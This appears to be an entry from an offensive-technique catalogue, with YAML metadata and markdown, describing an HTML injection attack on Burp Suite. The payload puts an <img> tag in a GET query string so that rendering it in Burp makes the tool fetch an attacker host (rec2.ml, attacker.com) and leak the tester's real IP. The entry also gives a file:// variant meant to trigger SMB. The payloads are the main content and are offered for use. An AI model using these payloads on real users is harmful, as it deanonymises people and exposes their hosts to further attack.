---
id: cmd-get-img-injection
data: >-
  GET
  /burpsuite_leak_vuln-leak_impact.html?=<html><img+src='http://www.rec2.ml/leak'>
  HTTP/1.1
tags:
  - html-injection
  - ip-leak
type: command
output: >-
  Burp Suite makes hidden HTTP request to http://www.rec2.ml/leak, leaking
  victim's real IP.
executor: http
platforms:
  - Desktop
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.374Z'
verified: false
validated: true
submitted: true
---
# GET-Request-with-IMG-Tag-Injection

## Command

```http
GET /burpsuite_leak_vuln-leak_impact.html?=<html><img+src='http://www.rec2.ml/leak'> HTTP/1.1
```

## Description

This HTTP GET request injects an HTML <img> tag into the query parameter to trigger an unsolicited fetch when rendered in Burp Suite, leaking the victim's real IP to the attacker's server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Query Parameter: =<html><img+src='http://www.rec2.ml/leak'> | HTML payload with img src pointing to attacker URL | Yes |

## Examples

### Basic Usage

```http
GET /target?=<html><img src='http://attacker.com/leak'> HTTP/1.1
```

### Advanced Usage

Replace URL with file:// for SMB trigger: ?=<html><img src='file://localhost/share'>

## Expected Output

When pasted and rendered in Burp Repeater, Burp issues a hidden GET to http://www.rec2.ml/leak, including victim's IP in the request headers, visible in server logs.

## Related

- [[commands/POST-Request-with-LINK-Tag-Injection]]
- [[procedures/Craft-Malicious-HTTP-Request-with-HTML-Injection]]
